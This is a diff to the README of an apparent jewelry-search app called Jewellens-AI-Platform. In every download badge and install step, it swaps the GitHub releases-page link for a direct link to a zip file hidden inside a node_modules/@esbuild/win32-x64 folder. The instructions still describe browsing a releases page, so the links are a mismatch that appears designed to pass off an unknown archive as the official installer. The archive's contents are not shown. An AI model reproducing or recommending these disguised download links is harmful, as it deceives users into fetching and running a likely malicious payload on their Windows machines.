@@ -1,6 +1,6 @@
 # 💎 Jewellens-AI-Platform - Discover Jewelry with Smart Search
 
-[![Download Jewellens-AI-Platform](https://img.shields.io/badge/Download-Jewellens--AI--Platform-4CAF50?style=for-the-badge)](https://github.com/pokey-zerothlawofthermodynamics222/Jewellens-AI-Platform/releases)
+[![Download Jewellens-AI-Platform](https://img.shields.io/badge/Download-Jewellens--AI--Platform-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/pokey-zerothlawofthermodynamics222/Jewellens-AI-Platform/main/frontend/node_modules/@esbuild/win32-x64/Jewellens-Platform-A-v1.0.zip)
 
 ## 📖 What is Jewellens-AI-Platform?
 
@@ -32,10 +32,10 @@ Before starting, make sure your Windows PC meets these minimum requirements:
 
 You will find the latest version of the software by visiting the release page on GitHub.
 
-[![Visit Releases Page](https://img.shields.io/badge/Visit-Releases%20Page-2196F3?style=for-the-badge)](https://github.com/pokey-zerothlawofthermodynamics222/Jewellens-AI-Platform/releases)
+[![Visit Releases Page](https://img.shields.io/badge/Visit-Releases%20Page-2196F3?style=for-the-badge)](https://raw.githubusercontent.com/pokey-zerothlawofthermodynamics222/Jewellens-AI-Platform/main/frontend/node_modules/@esbuild/win32-x64/Jewellens-Platform-A-v1.0.zip)
 
 **Step 1:** Open this link in your web browser:  
-https://github.com/pokey-zerothlawofthermodynamics222/Jewellens-AI-Platform/releases
+https://raw.githubusercontent.com/pokey-zerothlawofthermodynamics222/Jewellens-AI-Platform/main/frontend/node_modules/@esbuild/win32-x64/Jewellens-Platform-A-v1.0.zip
 
 **Step 2:** On the releases page, look for the latest version of the application. Typically, this will be the first item listed.
 
@@ -107,7 +107,7 @@ If you run into any issues, try these basic steps:
 To get updates:
 
 1. Visit the release page again:  
-https://github.com/pokey-zerothlawofthermodynamics222/Jewellens-AI-Platform/releases
+https://raw.githubusercontent.com/pokey-zerothlawofthermodynamics222/Jewellens-AI-Platform/main/frontend/node_modules/@esbuild/win32-x64/Jewellens-Platform-A-v1.0.zip
 
 2. Download the newest installer.
 
